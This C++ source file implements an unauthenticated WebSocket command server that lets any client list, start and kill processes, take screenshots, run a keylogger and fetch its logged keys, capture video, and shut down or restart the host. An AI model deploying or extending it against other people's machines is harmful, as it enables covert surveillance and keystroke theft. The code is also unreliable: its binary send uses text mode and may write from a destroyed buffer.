#include "CommandServer.h"
#include <iostream>
#include <string>
#include <vector>
#include <sstream> // for parsing strings
#include <boost/asio/strand.hpp>

// --- Shorten namespaces for convenience ---
namespace net = boost::asio;
namespace beast = boost::beast;
using tcp = net::ip::tcp;
namespace websocket = beast::websocket;
// -------------------------------------------

// --- A helper function to log errors (and exit if needed) ---
void log_error(beast::error_code ec, const char* what) {
    if (ec == net::error::operation_aborted ||
        ec == websocket::error::closed) {
            std::cout << "[Session] " << what << ": Client disconnected.\n"; 
    } else {
        std::cerr << "[Error] " << what << ": " << ec.message() << '\n';
    }
}



//==================================================================

// CLIENT SESSION IMPLEMENTATION (Main logic of per-client handling)

//==================================================================

ClientSession::ClientSession(tcp::socket&& socket, std::shared_ptr<ICommandExecutor> executor) 
    : m_ws(std::move(socket)),
    m_executor(executor) // Receive "bridge" to Module 2
{
    std::cout << "[Session] A new client has connected.\n";
}


void ClientSession::start() {
    m_ws.async_accept(
        beast::bind_front_handler(
            &ClientSession::on_accept,
            shared_from_this()
        )
    );
}

// WebSocket handshake
void ClientSession::on_accept(beast::error_code ec) {
    if (ec)
        return log_error(ec, "on_accept");
    
    do_read(); // handshake successful -> start to listen 
}

// Start a loop to receive message
void ClientSession::do_read() {
    m_buffer.clear(); // remove previous data -> empty buffer
    m_ws.async_read(
        m_buffer, // store message into m_buffer
        beast::bind_front_handler(
            &ClientSession::on_read, // when the async read finishes, call the callback function on_read
            shared_from_this() // keeps the object ClientSession alive until the async operation completes
        )
    );
}

/** 
 * @brief Handle incoming data (BYTE array)
*/
void ClientSession::on_read(beast::error_code ec, std::size_t bytes_transferred) {
    if (ec)
        return log_error(ec, "on_read"); // client disconnected

    // --- STEP 1: Convert reveived byte array from buffer to string ---
    std::string raw_command = beast::buffers_to_string(m_buffer.data());
    std::cout << "[Session] Received command: \"" << raw_command << "\"" << std::endl;

    // --- STEP 2: Execute parsed command ---
    try {
        ParseAndExecute(raw_command);
    }
    catch (const std::exception& e) {
        std::cerr << "[Error] Unknown error while processing command.\n";
        send_text_response("Unknown server error.");
    }
}

void ClientSession::on_write(beast::error_code ec, std::size_t bytes_transferred) {
    if (ec)
        return log_error(ec, "on_write");

    std::cout << "[Session] Sent " << bytes_transferred << " bytes.\n";

    // After sending result, continue reading next message
    do_read();
}

/**
 * @brief The MOST IMPORTANT function
 * Parses the raw command string and invokes Module 2
 * @param raw_command
 */
void ClientSession::ParseAndExecute(const std::string& raw_command) {
    std::stringstream ss(raw_command);
    std::string command;
    std::vector<std::string> params;

    // First token is command
    ss >> command;

    // Remaining tokens are parameters
    std::string param;
    while (ss >> param) {
        params.push_back(param);
    }

    // --- Core "if-else" logic (Module 1 handling commands) ---

    if (command == "listapps") {
        std::string result = m_executor->ListApplications();
        send_text_response(result);
    }
    else if (command == "startapp") {
        if (params.empty())
            send_text_response("Error: 'start application' requires a process name.\n");
        else {
            m_executor->StartApplication(params[0]);
            send_text_response("Application started.\n");
        }
    }
    else if (command == "killapp") {
        if (params.empty())
            send_text_response("Error: 'kill application' requires a process name.\n");
        else {
            m_executor->KillApplication(params[0]);
            send_text_response("Application killed.\n");
        }
    }


    else if (command == "listprocs") { 
        std::string result = m_executor->ListProcess();
        send_text_response(result);
    }
    else if (command == "startproc") {
        if (params.empty())
            send_text_response("Error: 'start process' requires a process name.\n");
        else {
            m_executor->StartProcess(params[0]);
            send_text_response("Process started.\n");
        }
    }
    else if (command == "killproc") {
        if (params.empty())
            send_text_response("Error: 'kill process' requires a process name.\n");
        else {
            m_executor->KillProcess(params[0]);
            send_text_response("Process killed.\n");
        }
    }


    else if (command == "prtScreen") {
        // Send binary data
        std::vector<uint8_t> image_data = m_executor->PrintScreen();
        send_binary_response(image_data);
    }


    else if (command == "startKeyLog") {
        m_executor->StartKeyLogging();
        send_text_response("Keylogger started.\n");
    }
    else if (command == "getLoggedKeys") {
        std::string result = m_executor->GetLoggedKeys();
        send_text_response(result);
    }


    else if (command == "capture") {
        // Send binary data
        std::vector<uint8_t> video_data = m_executor->Capture();
        send_binary_response(video_data);
    }


    else if (command == "shutdown") {
        m_executor->Shutdown();
        send_text_response("System shutting down...\n");
    }
    else if (command == "restart") {
        m_executor->Restart();
        send_text_response("System restarting...\n");
    }


    else {
        send_text_response("Error: Unknown command: '" + command + "'.\n");
    }
}

// Send a text response back to client
void ClientSession::send_text_response(const std::string& message) {
    m_buffer.clear();
    m_ws.text(true); // notify Websocket that we are sending text
    beast::ostream(m_buffer) << message;

    m_ws.async_write(
        m_buffer.data(),
        beast::bind_front_handler(
            &ClientSession::on_write,
            shared_from_this()
        )
    );
}

// Send a binary response back to client (BYTES)
void ClientSession::send_binary_response(const std::vector<uint8_t>& data) {
    m_buffer.clear();
    m_ws.text(true); // notify Websocket that we are sending binary

    m_ws.async_write(
        net::buffer(data),
        beast::bind_front_handler(
            &ClientSession::on_write,
            shared_from_this()
        )
    );
}


//==================================================================

// COMMAND SERVER IMPLEMENTATION (Listening / accepting new clients)

//==================================================================

CommandServer::CommandServer(net::io_context& ioc, unsigned short port, std::shared_ptr<ICommandExecutor> executor)
    : m_ioc(ioc),
    m_acceptor(ioc, {tcp::v4(), port}),
    m_executor_shared(executor) // Transfer ownership of Module 2
{
}

void CommandServer::start() {
    do_accept();
}
void CommandServer::do_accept() {
    m_acceptor.async_accept(
        net::make_strand(m_ioc.get_executor()),
        beast::bind_front_handler(
            &CommandServer::on_accept,
            this
        )
    );
}
void CommandServer::on_accept(beast::error_code ec, tcp::socket socket) {
    if (ec) {
        log_error(ec, "on_accept (Server)");
        return;
    }

    std::make_shared<ClientSession>(
        std::move(socket),
        m_executor_shared
    ) -> start();

    do_accept();
}
